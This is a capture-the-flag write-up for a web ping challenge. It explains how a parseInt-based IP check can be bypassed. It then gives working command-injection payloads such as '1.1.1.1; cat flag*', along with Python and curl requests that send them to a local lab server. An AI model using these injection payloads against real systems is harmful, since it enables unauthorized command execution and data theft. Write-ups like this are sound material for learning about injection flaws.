# Solution
- We see that the challenge expects an IP from us and it will ping it.
- Our target is to inject something to the IP field so we can have RCE. (Remote Code Execution)
- We analyze the website's check function:
```js
function checkIP(ip) {
    if (typeof ip !== 'string') 
        return false;
    if (ip.indexOf('.') == -1)
        return false;
    let parts = ip.split('.');
    if (parts.length !== 4) 
        return false;
    for (let part of parts) {
        let num = parseInt(part);
        if (isNaN(num) || num < 0 || num > 255)
            return false;
    }
    return true;
}
```
- It checks if the IP is a string, if it has 4 parts separated by dots, and if each part is a number between 0 and 255.
- The problem with `parseInt` is that it will ignore everything after the first non-numeric character, so `parseInt('256 hello')` will return `256`.
- We can inject commands by: `1.1.1.1; ls -lah`
- To read the flag, we can use: `1.1.1.1; cat flag*`. (We use the wildcard `*` since we aren't allowed any extra `.` in the IP)
```python
from requests import post
print(post('http://localhost:1337/ping', json={'ip': '1.1.1.1; cat flag*'}).json()['result'].split('\n')[-1])
```
```bash
curl 'http://localhost:1337/ping' \
  -H 'Content-Type: application/json' \
  --data-raw '{"ip":"1.1.1.1; cat flag*"}'
```